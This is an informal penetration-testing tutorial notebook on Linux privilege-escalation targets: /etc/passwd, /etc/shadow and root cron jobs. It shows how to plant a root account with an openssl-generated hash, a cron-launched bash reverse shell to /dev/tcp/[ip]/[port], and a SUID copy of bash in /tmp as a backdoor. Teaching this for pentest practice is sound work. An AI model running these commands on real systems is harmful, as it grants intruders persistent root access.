#!/usr/bin/env python
# coding: utf-8

# # Linux Fun
# 
# So, we know our target is a Linux box, what can we do with this information? There’s a whole range of locations that could be interesting if we are looking to exploit a box. While many parallels can be drawn between this section and Windows, they are different OS' and should be understood separately.
# 
# ## Password locations
# The keys to the safe; but even keys need to be kept somewhere.
# 
# ### /etc/passwd
# While this looks like a password file, you’re only half right. In *most* modern versions the user/password file has been split in 2. The user list and details about the users are kept here.<br>
# This file is made up of individual lines, each referring to an individual user. The format doesn’t really change too much if you’re in an old or new version though. Each line is a colon (:) separated list<br>
# 
# > test:x:0:0:secretaccount:/root:/bin/bash
# 
# - Test: the user name of this account
# - x: the hashed password (if hashes are split off, this is normally an 'x')
# - 0: User ID, zero is reserved for root users
# - 0: Group ID, again zero is reserved for root groups
# - secretaccount: Comments about the user
# - /root: The home directory of the user
# - /bin/bash: the shell location for the user
# 
# Clearly this is an example account, but you should be able to get the format from this.<br>
# Next question, how do we modify this file? Well, it’s a txt file, so however you would like :-). The issue is this file is normally root only writeable.<br>
# 
# Let’s say you have done some [PriveligeEscalation](../Tools/PriveligeEscalation/PriveligeEscalation.ipynb) and can get a root exploit through. This is a great way to maintain access, just make yourself an account. Most of this is trivial, except generating the hashed password. Fortunately, Kali comes with methods for this
# 
# > openssl passwd -1 -salt[your salt here] [the new password]
# 
# This will generate a hash for you, based on your provide password. If you dont want to salt (or its not required), drop the -1 and -salt[]
# <hr>
# ### /etc/shadow
# When the hashes were removed from /etc/passwd they showed up here. Again, this file is normally root readable only.
# <hr>
# 

# ## /etc/crontab
# Cron (or CronTabs / CronJobs) is the Linux equivalent of Windows' Task Scheduler. It simply launches programs based on a defined time schedule. If you can view this file there may be jobs set to run as root, and it tells you the file it executes. Who's stopping us from changing this file? No-one, that’s who. <br>
# The obvious first point is to launch a shell as this user, a reverse shell looks a lot like this
# 
# > #!/bin/bash <br>
# > bash -i >& /dev/tcp/[ip]/[port] 0>&1
# 
# This will launch a reverse shell back to your machine... Neat.

# In[1]:


from IPython.display import Video
Video("../videos/BenderNeat.mp4", embed=True,html_attributes="muted controls autoplay loop", width=452, height=332)


# Source: https://giphy.com/gifs/8vtm3YCdxtUvjTn0U3
# <br>
# Alternatively, you may want to create a new shell somewhere you can access.
# 
# > #!/bin/bash<br>
# > cp /bin/bash /tmp/rootbash<br>
# > chmod +xs /tmp/rootbash
# 
# <hr>
